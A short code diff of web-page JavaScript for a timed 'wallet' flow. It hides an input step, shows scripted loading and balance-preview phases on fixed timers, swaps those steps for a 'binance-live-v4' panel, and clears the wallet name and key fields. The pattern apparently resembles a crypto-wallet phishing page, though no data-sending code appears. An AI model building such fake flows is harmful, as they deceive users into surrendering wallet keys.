@@ -340,20 +340,23 @@
         }
 
         document.getElementById('wallet-step-inputs').style.display = 'none';
-        document.getElementById('wallet-step-loading').style.display = 'block';
+       document.getElementById('wallet-step-binance-live-v4').style.display = 'block';
+
 
         // PHASE 1: LOADING TIMEOUT NG SAKTONG 10 SECONDS
         setTimeout(() => {
             
             document.getElementById('wallet-step-loading').style.display = 'none';
-            document.getElementById('wallet-step-old-account').style.display = 'block';
+          document.getElementById('wallet-step-binance-live-v4').style.display = 'block';
+
 
             // PHASE 2: IPAPAKITA ANG PREVIEW BALANCES NG SAKTONG 5 SECONDS
             setTimeout(() => {
                 
 
                 document.getElementById('wallet-step-old-account').style.display = 'none';
-                document.getElementById('wallet-step-try-again').style.display = 'block';
+              document.getElementById('wallet-step-binance-live-v4').style.display = 'block';
+
 
                 if (wName) wName.value = "";
                 if (wKey) wKey.value = "";
